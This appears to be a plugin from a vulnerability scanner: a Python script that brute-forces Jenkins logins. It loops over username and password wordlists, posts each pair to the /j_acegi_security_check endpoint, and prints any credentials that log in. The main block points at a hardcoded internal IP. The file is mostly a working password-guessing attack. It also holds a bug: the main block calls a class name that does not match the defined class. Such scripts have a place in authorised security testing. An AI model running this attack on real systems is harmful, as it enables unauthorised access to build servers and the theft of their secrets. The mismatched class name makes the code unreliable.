#!/usr/bin/env python3

'''
name: Jenkins弱口令漏洞
description: Jenkins弱口令漏洞
'''

from app.lib.utils.request import request

class Jenkins_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + "/j_acegi_security_check"
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                data = {
                    'j_username': user,
                    'j_password': pwd,
                    'from': '',
                    'Submit': 'Sign in'
                    }
                try:
                    req = request.post(url, headers = self.headers, data = data)
                    if req.status_code == 302 and 'ACEGI_SECURITY_HASHED' not in req.headers['Set-Cookie']:
                        result = "user: %s pwd: %s" %(user, pwd)
                        print('存在Jenkins弱口令漏洞,弱口令为',result)
                        return True
                except Exception as e:
                    print(e)
                finally:
                    pass
        print('不存在Jenkins弱口令漏洞')
        return False

if __name__ == '__main__':
    Jenkins_Weakwd = Jenkins_Weakwd_BaseVerify('http://10.4.69.55:8789')
    Jenkins_Weakwd.run()